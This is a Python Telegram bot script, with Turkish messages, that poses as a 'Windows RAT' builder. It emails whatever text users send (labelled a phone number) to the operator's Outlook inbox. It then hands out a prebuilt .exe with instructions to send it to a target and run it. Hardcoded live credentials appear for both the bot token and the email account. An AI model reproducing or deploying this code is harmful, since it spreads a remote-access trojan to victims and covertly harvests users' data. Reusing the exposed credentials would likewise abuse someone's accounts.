import telebot
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Set up Telegram bot
bot_token = '6577534731:AAGAA54GYoO-YKlfVl0W04UV3W8wv0zDSVw'
bot = telebot.TeleBot(bot_token)

# Set up Outlook email credentials
email_address = 'oplebran8899@outlook.com'
email_password = '990@lebrAn'

# Function to send email
def send_email(subject, message):
    try:
        msg = MIMEMultipart()
        msg['From'] = email_address
        msg['To'] = email_address
        msg['Subject'] = subject
        msg.attach(MIMEText(message, 'plain'))

        server = smtplib.SMTP('smtp.outlook.com', 587)
        server.starttls()
        server.login(email_address, email_password)
        text = msg.as_string()
        server.sendmail(email_address, email_address, text)
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print("Error sending email:", e)

# Welcome message
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Windows bilgisayar RAT botuna hoşgeldiniz. Devam etmek için /agree yazın")

# Handle /agree command
@bot.message_handler(commands=['agree'])
def agree_command(message):
    bot.reply_to(message, ".exe dosyası oluşturmak için /devam yazın.")

# Handle phone number input
@bot.message_handler(func=lambda message: True, content_types=['text'])
def handle_phone_number(message):
    send_email("Telegram Phone Number", message.text.strip())
    bot.reply_to(message, ".exe oluşturuluyor...")
    time.sleep(10)  # Wait 10 seconds
    # Send the apk file
    apk_path = '/home/fulizsece/ReyHan.exe'
    with open(apk_path, 'rb') as apk_file:
        bot.send_document(message.chat.id, apk_file)
    bot.reply_to(message, ".exe oluşturuldu. .exe dosyasını kişiye gönderin. Siz istemedikçe RAT telefona zarar vermez. İsterseniz .exe dosyasının ismini değiştirebilirsiniz. Kişi .exe dosyasını çalıştırdıktan sonra /kontrol yazın.")

# Start the bot
bot.polling()

